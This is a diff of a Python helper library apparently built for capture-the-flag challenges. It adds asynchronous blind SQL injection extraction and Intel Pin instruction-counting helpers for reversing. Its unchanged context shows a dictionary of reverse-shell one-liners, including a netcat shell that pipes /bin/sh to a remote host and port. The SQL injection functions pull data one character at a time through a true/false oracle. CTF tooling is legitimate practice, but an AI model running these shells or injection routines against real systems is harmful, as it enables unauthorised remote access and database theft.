@@ -1,5 +1,8 @@
 #!/usr/bin/env python3
+import subprocess
+import asyncio
 import base64
+import functools
 import hashlib
 import hmac
 import json
@@ -8,12 +11,12 @@ import os
 import pickle
 import string
 import time
-
 import requests
+from pathlib import Path
 
 #taken from https://github.com/lukechilds/reverse-shell
 #and http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
-#call with str.format(host,port)
+#call with str.format(host, port)
 rev_shells = {
 	"nc":
 		"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {} {} > /tmp/f",
@@ -69,6 +72,28 @@ def blind_sqli(inject_template, sqli_oracle, chars=_chars):
 					break
 			except requests.exceptions.ConnectionError:  # really bad error handling
 				time.sleep(1)
+				break
+		else:
+			return val
+
+async def _blind_sqli_async_helper(inject_template, sqli_oracle, val):
+	res = await sqli_oracle(inject_template.format(val))
+	print(val, res)
+	return res, val
+
+async def blind_sqli_async(inject_template, sqli_oracle, chars=_chars):
+	"""sqli_oracle takes a sql condition and returns if its true or false
+	inject_template is the template for injecting into sqli_oracle"""
+	val = ""
+	helper = functools.partial(_blind_sqli_async_helper, inject_template, sqli_oracle)
+	while True:
+		coros = [asyncio.create_task(helper(val + c)) for c in chars]
+		for coro in asyncio.as_completed(coros):
+			success, curr_val = await coro
+			if success:
+				for coro in coros:
+					coro.cancel()
+				val = curr_val
 				break
 		else:
 			return val
@@ -164,3 +189,55 @@ def jwt_b64decode(s: bytes):
 
 def jwt_b64encode(s: bytes):
 	return base64.urlsafe_b64encode(s).rstrip(b"=")
+
+# for rev challs
+PIN = Path("~/pin/pin").expanduser()
+INSCOUNT32 = Path("~/pin/source/tools/ManualExamples/obj-ia32/inscount0.so").expanduser()
+INSCOUNT64 = Path("~/pin/source/tools/ManualExamples/obj-intel64/inscount0.so").expanduser()
+
+def pin_sync(filename, inscount, passwd, argv=False, out_file="inscount.out"):
+	if argv:
+		subprocess.run(
+			[PIN, "-t", inscount, "-o", out_file, "--", filename, passwd],
+			check=False,
+		)
+	else:
+		subprocess.run(
+			[PIN, "-t", inscount, "-o", out_file, "--", filename],
+			input=passwd.encode() + b"\n",
+			check=False,
+		)
+	with open(out_file) as f:
+		output = f.read()
+		return int(output.partition(" ")[2])
+
+async def pin(filename, inscount, val, argv=False, out_file="inscount.out"):
+	if argv:
+		process = await asyncio.create_subprocess_exec(
+			PIN,
+			"-t",
+			inscount,
+			"-o",
+			out_file,
+			"--",
+			filename,
+			val,
+			stdout=asyncio.subprocess.DEVNULL
+		)
+		_, _ = await process.communicate()
+	else:
+		process = await asyncio.create_subprocess_exec(
+			PIN,
+			"-t",
+			inscount,
+			"-o",
+			out_file,
+			"--",
+			filename,
+			stdin=asyncio.subprocess.PIPE,
+			stdout=asyncio.subprocess.DEVNULL
+		)
+		_, _ = await process.communicate(val.encode() + b"\n")
+	with open(out_file) as f:
+		output = f.read()
+		return int(output.partition(" ")[2])
